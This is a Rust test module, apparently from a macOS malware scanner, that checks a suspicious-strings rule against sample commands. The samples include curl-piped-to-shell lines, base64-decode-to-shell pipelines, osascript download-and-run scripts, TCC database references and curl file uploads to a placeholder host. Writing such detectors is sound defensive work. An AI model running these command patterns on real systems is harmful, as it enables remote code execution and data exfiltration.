        assert!(fires(r"\curl x | sh", DOWNLOAD_TO_SHELL));
        assert!(fires(r"echo \\; curl x | sh", DOWNLOAD_TO_SHELL));
    }

    #[test]
    fn regex_alternation_is_not_a_pipe() {
        assert!(none_fire(
            r"|^(bash <<<|curl -kfsSL) x|openssl base64 -d|^curl -s\b.+?\| (bash|sh|zsh)\b|y"
        ));
        assert!(fires("curl x|sh", DOWNLOAD_TO_SHELL));
        assert!(fires("$(curl x|sh)", DOWNLOAD_TO_SHELL));
        assert!(fires("curl x|gunzip|sh", DOWNLOAD_TO_SHELL));
        assert!(fires("( curl x | sh )", DOWNLOAD_TO_SHELL));
    }

    #[test]
    fn decode_to_shell_fires_on_canonical_forms() {
        for t in [
            "echo \"$P\" | base64 -d | gunzip | sh",
            "echo x | base64 -D | bash",
            "echo x | base64 --decode | sh",
            "echo x | openssl enc -d -base64 | sh",
            "echo x | openssl base64 -d | sh",
            "echo x | xxd -r -p | sh",
        ] {
            assert!(fires(t, DECODE_TO_SHELL), "{t}");
        }
    }

    #[test]
    fn decode_to_shell_needs_flags_and_a_shell() {
        assert!(none_fire("echo x | base64 | sh"));
        assert!(none_fire("echo x | base64 -d | cat"));
        assert!(none_fire("echo x | openssl enc | sh"));
        assert!(none_fire("echo x | openssl sha256 -d | sh"));
        assert!(none_fire("echo x | xxd | sh"));
    }

    #[test]
    fn osascript_download_needs_the_order() {
        assert!(fires(
            "osascript -e 'do shell script \"curl http://x && sh /tmp/x\"'",
            OSASCRIPT_DOWNLOAD
        ));
        assert!(none_fire("osascript -e 'do shell script \"ls\"'"));
        assert!(none_fire("osascript -e 'display dialog \"curl\"'"));
        assert!(none_fire(
            "curl x -o f; osascript -e 'do shell script \"ls\"'"
        ));
    }

    #[test]
    fn applescript_source_needs_no_osascript_token() {
        assert!(fires(
            "do shell script \"curl -o /tmp/x http://y && sh /tmp/x\"",
            OSASCRIPT_DOWNLOAD
        ));
        assert!(none_fire("do shell script \"kextunload -b com.example.x\""));
        assert!(none_fire("curl x; do shell script \"ls\""));
    }

    #[test]
    fn tcc_database_fires_anywhere() {
        assert!(fires("x/Library/TCC/TCC.db y", TCC_DATABASE));
    }

    #[test]
    fn local_upload_fires_on_canonical_forms() {
        for t in [
            "curl -X POST --data-binary @/tmp/x http://h",
            "curl --data @f http://h",
            "curl -d @f http://h",
            "curl -F file=@/tmp/x http://h",
            "curl -F \"f=@/tmp/x\" http://h",
            "curl -T /tmp/x http://h",
            "curl --upload-file /tmp/x http://h",
        ] {
            assert!(fires(t, LOCAL_UPLOAD), "{t}");
        }
        for t in [
            "curl -d k=v http://h",
            "curl -F k=v http://h",
            "wget --data @f http://h",
            "foo -d @f",
        ] {
            assert!(!fires(t, LOCAL_UPLOAD), "{t}");
        }
    }

    #[test]
    fn lines_split_on_cr_and_nul() {
        assert!(fires("x\rcurl a | sh", DOWNLOAD_TO_SHELL));
        assert!(fires("x\0curl a | sh\0y", DOWNLOAD_TO_SHELL));
        assert!(none_fire("curl a\r| sh"));
        assert!(none_fire("curl a\0| sh"));
    }

    #[test]
    fn form_flag_runs_stay_linear() {
        for unit in ["-F/", ",-F"] {
            let line = format!("curl {}", unit.repeat(400_000));
            let start = std::time::Instant::now();
            assert!(none_fire(&line));
            assert!(
                start.elapsed() < std::time::Duration::from_secs(5),
                "{unit}"
            );
        }
    }

    #[test]
    fn a_pattern_wider_than_the_span_does_not_fire() {
        let far = format!("curl x {} | sh", "a ".repeat(PATTERN_SPAN / 2));
        assert!(none_fire(&far));
        let near = format!("curl x {} | sh", "a ".repeat(PATTERN_SPAN / 2 - 16));
        assert!(fires(&near, DOWNLOAD_TO_SHELL));
    }

    #[test]
    fn many_candidates_on_one_line_stay_linear() {
        let line = "curl;".repeat(400_000);
        let start = std::time::Instant::now();
        assert!(none_fire(&line));
        assert!(start.elapsed() < std::time::Duration::from_secs(5));
    }

    #[test]
    fn a_pattern_cut_by_a_non_first_window_edge_is_not_matched() {
        let mut hits = [false; PATTERNS.len()];
        scan_patterns("curl x | sh", false, true, &mut hits);
        assert!(!hits[DOWNLOAD_TO_SHELL]);
        scan_patterns("a; curl x | sh", false, true, &mut hits);
        assert!(hits[DOWNLOAD_TO_SHELL]);
    }

    #[test]
    fn rule_reports_patterns_before_names() {
        let ctx = ScanContext::from_embedded_bytes(
            "x.sh",
            b"#!/bin/sh\ncurl -fsSL http://x | sh\n".to_vec(),
            false,
        );
        let sig = SuspiciousStringsRule.evaluate(&ctx).unwrap().unwrap();
        assert!(sig
            .description
            .starts_with("matched 3 indicator(s): download piped to a shell"));
        assert_eq!(sig.weight, 15 + 2 * NAME_WEIGHT);
    }

    fn weight_of(name: &str, content: &[u8]) -> Option<i32> {
        let ctx = ScanContext::from_embedded_bytes(name, content.to_vec(), false);
        SuspiciousStringsRule
            .evaluate(&ctx)
            .expect("rule should be applicable")
            .map(|s| s.weight)
    }

    fn binary_with(tail: &[u8]) -> Vec<u8> {
        let mut c = vec![0x9Du8; 600];
        c.extend_from_slice(tail);
        c
    }

    #[test]
    fn names_alone_in_a_script_score_two_each_up_to_the_cap() {
        assert_eq!(weight_of("x.sh", b"#!/bin/sh\ndlopen\n"), Some(NAME_WEIGHT));
        assert_eq!(
            weight_of("x.sh", b"#!/bin/sh\ndlopen NSAppleScript\n"),
            Some(2 * NAME_WEIGHT)
        );
        assert_eq!(
            weight_of(
                "x.sh",
                b"#!/bin/sh\ndlopen NSAppleScript osascript SecKeychain\n"
            ),
            Some(NAME_FLOOR_CAP)
        );
    }

    #[test]
    fn names_alone_in_a_binary_score_nothing() {
        let bin = binary_with(b"\0dlopen\0NSAppleScript\0osascript\0SecKeychain\0");
        assert_eq!(weight_of("x.bin", &bin), None);
    }

    #[test]
    fn patterns_still_score_in_a_binary() {
        let bin = binary_with(b"\0curl -s http://x | sh\0dlopen\0");
        assert_eq!(weight_of("x.bin", &bin), Some(15));
    }

    #[test]
    fn a_pattern_plus_names_in_a_script_adds_the_capped_names() {
        let s = b"#!/bin/sh\ncurl -s http://x | sh\ndlopen NSAppleScript osascript\n";
        // Names: `curl `, `| sh`, dlopen, NSAppleScript, osascript = 10, capped.
        assert_eq!(weight_of("x.sh", s), Some(15 + NAME_FLOOR_CAP));
    }

    /// A pattern straddling a `STREAM_CHUNK` boundary lands whole, with its
    /// left context, in the next window's overlap.
    #[test]
    fn pattern_straddling_a_stream_chunk_boundary_is_found() {
        for back in [3u64, 200, 4000] {
            let total_len = MAX_CONTENT_BYTES as u64 + 4096;
            let path = sparse_temp_file("pattern-straddle", total_len);
            let boundary = 9 * STREAM_CHUNK as u64;
            write_at(&path, boundary - back, b"\ncurl -fsSL http://x | sh\n");

            let ctx = ScanContext::load(&path);
            assert!(ctx.truncated);
            let sig = SuspiciousStringsRule
                .evaluate(&ctx)
                .expect("rule should be applicable")
                .expect("pattern straddling a window boundary should be found");
            assert!(sig.description.contains("download piped to a shell"));

            let _ = std::fs::remove_file(&path);
        }
    }

    /// A marker past the 8 MiB prefix is invisible to a prefix-only scan, but
    /// `covers_truncation` opts this rule into streaming the whole file, so
    /// `evaluate` finds it.
    #[test]
    fn marker_past_the_prefix_is_found_when_covered() {
        let total_len = MAX_CONTENT_BYTES as u64 + 64 * 1024;
        let path = sparse_temp_file("past-prefix", total_len);
        write_at(&path, MAX_CONTENT_BYTES as u64 + 100, b"TCC.db");

        let ctx = ScanContext::load(&path);
        assert!(ctx.truncated);
        let rule = SuspiciousStringsRule;
        assert!(rule.covers_truncation(&ctx));
        rule.evaluate(&ctx)
            .expect("rule should be applicable")
            .expect("marker past the 8 MiB prefix should be found");

        let _ = std::fs::remove_file(&path);
    }

    /// A marker split across a `STREAM_CHUNK` boundary must still land whole
    /// in some window's overlap and be found.
    #[test]
    fn marker_straddling_a_stream_chunk_boundary_is_found() {
        let total_len = MAX_CONTENT_BYTES as u64 + 4096;
        let path = sparse_temp_file("chunk-straddle", total_len);
        write_at(&path, STREAM_CHUNK as u64 - 3, b"TCC.db");

        let ctx = ScanContext::load(&path);
        assert!(ctx.truncated);
        let rule = SuspiciousStringsRule;
        assert!(rule.covers_truncation(&ctx));
        rule.evaluate(&ctx)
            .expect("rule should be applicable")
            .expect("marker straddling a chunk boundary should be found");

        let _ = std::fs::remove_file(&path);
    }

    /// `| sh` ending exactly at a non-final window's boundary, immediately
    /// followed by `asum`, must not match — the same bytes reappear whole in
    /// the next window with `asum` right after them.
    #[test]
    fn bounded_marker_ending_at_a_window_boundary_is_not_matched() {
        let total_len = 10 * STREAM_CHUNK as u64;
        let path = sparse_temp_file("boundary-not-matched", total_len);
        let boundary = 9 * STREAM_CHUNK as u64; // past the 8 MiB prefix
        write_at(&path, 0, b"#!/bin/sh\n");
        write_at(&path, boundary - 4, b"| shasum");

        let ctx = ScanContext::load(&path);
        assert!(ctx.truncated);
        let rule = SuspiciousStringsRule;
        assert!(rule.covers_truncation(&ctx));
        assert!(
            rule.evaluate(&ctx)
                .expect("rule should be applicable")
                .is_none(),
            "| sh ending exactly at a window boundary, followed by asum, must not match"
        );

        let _ = std::fs::remove_file(&path);
    }

    /// The same `| sh` at the true end of the file (nothing following at
    /// all) does match — that's a real end-of-input boundary, not a window
    /// artifact.
    #[test]
    fn bounded_marker_at_the_true_end_of_the_file_is_matched() {
        let total_len = 10 * STREAM_CHUNK as u64;
        let path = sparse_temp_file("end-of-file-matched", total_len);
        write_at(&path, 0, b"#!/bin/sh\n");
        write_at(&path, total_len - 4, b"| sh");

        let ctx = ScanContext::load(&path);
        assert!(ctx.truncated);
        let rule = SuspiciousStringsRule;
        assert!(rule.covers_truncation(&ctx));
        rule.evaluate(&ctx)
            .expect("rule should be applicable")
            .expect("| sh at the true end of the file should match");

        let _ = std::fs::remove_file(&path);
    }

    /// Past `MAX_STREAM_BYTES`, `covers_truncation` declines and `evaluate`
    /// falls back to the 8 MiB prefix — a marker further in is missed, not
    /// discovered at the cost of streaming a huge file.
    #[cfg(unix)]
    #[test]
    fn file_beyond_the_stream_cap_falls_back_to_prefix_only_scan() {
        let total_len = MAX_STREAM_BYTES + 1;
        let path = sparse_temp_file("beyond-stream-cap", total_len);
        write_at(&path, MAX_CONTENT_BYTES as u64 + 100, b"TCC.db");

        let ctx = ScanContext::load(&path);
        assert!(ctx.truncated);
        let rule = SuspiciousStringsRule;
        assert!(!rule.covers_truncation(&ctx));
        assert!(
            rule.evaluate(&ctx)
                .expect("rule should be applicable")
                .is_none(),
            "a marker past the 8 MiB prefix must not be found when the file exceeds the stream cap"
        );

        let _ = std::fs::remove_file(&path);
    }

    /// A stream that fails partway through must not discard the hits it
    /// already found in the bytes it did read — and must not claim
    /// `covers_truncation`, since it didn't finish (§10/§11.8).
    #[test]
    fn stream_failure_partway_keeps_hits_already_found_and_declines_coverage() {
        let total_len = MAX_CONTENT_BYTES as u64 + 4096;
        let path = sparse_temp_file("stream-fails-partway", total_len);
        write_at(&path, 0, b"TCC.db");

        let ctx = ScanContext::load(&path);
        assert!(ctx.truncated);

        // Shrink the file out from under the already-loaded context:
        // `file_len` still claims the original size, so `for_each_window`
        // reads the marker fine from `content` but then fails once it needs
        // a chunk past the (now-real) end of the file.
        std::fs::OpenOptions::new()
            .write(true)
            .open(&path)
            .unwrap()
            .set_len(8)
            .unwrap();

        let rule = SuspiciousStringsRule;
        let sig = rule
            .evaluate(&ctx)
            .expect("a hit found before the failure keeps the rule applicable")
            .expect("the marker at offset 0 must still be reported");
        assert!(sig.description.contains("TCC permissions database"));
        assert!(
            !rule.covers_truncation(&ctx),
            "a failed stream must not claim coverage"
        );

        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn continued_line_straddling_a_stream_chunk_boundary_is_found() {
        let total_len = MAX_CONTENT_BYTES as u64 + 4096;
        let path = sparse_temp_file("continuation-straddle", total_len);
        let boundary = 9 * STREAM_CHUNK as u64;
        write_at(
            &path,
            boundary - 12,
            b"\ncurl -fsSL http://x \\\n  | bash\n",
        );

        let ctx = ScanContext::load(&path);
        assert!(ctx.truncated);
        let sig = SuspiciousStringsRule
            .evaluate(&ctx)
            .expect("rule should be applicable")
            .expect("continued pattern across a window boundary should be found");
        assert!(sig.description.contains("download piped to a shell"));

        let _ = std::fs::remove_file(&path);
    }

    /// A stream that fails with only a name found in a binary prefix could
    /// have hidden a pattern: NotApplicable, not a clean verdict (§10/§11.8).
    #[test]
    fn failed_stream_with_only_binary_names_is_not_applicable() {
        let total_len = MAX_CONTENT_BYTES as u64 + 4096;
        let path = sparse_temp_file("stream-fails-binary-names", total_len);
        write_at(&path, 0, &[0x9D; 600]);
        write_at(&path, 600, b"\0dlopen\0");

        let ctx = ScanContext::load(&path);
        assert!(ctx.truncated);
        std::fs::OpenOptions::new()
            .write(true)
            .open(&path)
            .unwrap()
            .set_len(1024)
            .unwrap();

        let rule = SuspiciousStringsRule;
        assert!(matches!(
            rule.evaluate(&ctx),
            Err(RuleOutcome::NotApplicable)
        ));
        assert!(!rule.covers_truncation(&ctx));

        let _ = std::fs::remove_file(&path);
    }

    /// A bounded marker ending exactly at a truncated capture's cut is
    /// inconclusive — the byte that would decide it (`| sh` vs. `| shasum`)
    /// was never read — so it must not match; the same bytes, known to be
    /// the whole content, are a real end of input and do match (§10/§11.8).
    #[test]
    fn bounded_marker_at_a_non_streamable_truncated_cut_is_not_matched() {
        let content = b"#!/bin/sh\nhttp://x | sh".to_vec();

        let truncated = ScanContext::from_embedded_bytes("x.pkg!payload", content.clone(), true);
        assert!(
            SuspiciousStringsRule
                .evaluate(&truncated)
                .expect("rule should be applicable")
                .is_none(),
            "a marker ending exactly at an unstreamable truncated cut must not match"
        );

        let whole = ScanContext::from_embedded_bytes("x.pkg!payload", content, false);
        SuspiciousStringsRule
            .evaluate(&whole)
            .expect("rule should be applicable")
            .expect("the same bytes, not truncated, are a real end of input");
    }

    /// Embedded content has no file behind it, so it can never be streamed.
    #[test]
    fn embedded_truncated_content_does_not_cover_truncation() {
        let ctx = ScanContext::from_embedded_bytes("x.pkg!Scripts/preinstall", vec![1, 2, 3], true);
        assert!(!SuspiciousStringsRule.covers_truncation(&ctx));
    }

    /// A context that looks file-backed but has no actual file handle (the
    /// shape a non-unix platform's `read_at_file` always leaves, since it
    /// never serves a real read either way) must not claim coverage — every
    /// streamed byte past `content` would in fact be unreachable (§5.2,
    /// #45).
    #[test]
    fn file_backed_without_a_handle_does_not_cover_truncation() {
        let ctx = crate::context::ScanContext {
            path: "app".into(),
            content: Some(b"benign".to_vec()),
            truncated: true,
            file_len: Some(6),
            identity: None,
            source: crate::context::ContentSource::File,
            file: None,
            codesign_dv_cache: std::sync::OnceLock::new(),
            spctl_cache: std::sync::OnceLock::new(),
            macho_cache: std::sync::OnceLock::new(),
            stream_failures: std::sync::Mutex::new(Vec::new()),
        };
        assert!(!SuspiciousStringsRule.covers_truncation(&ctx));
    }
}
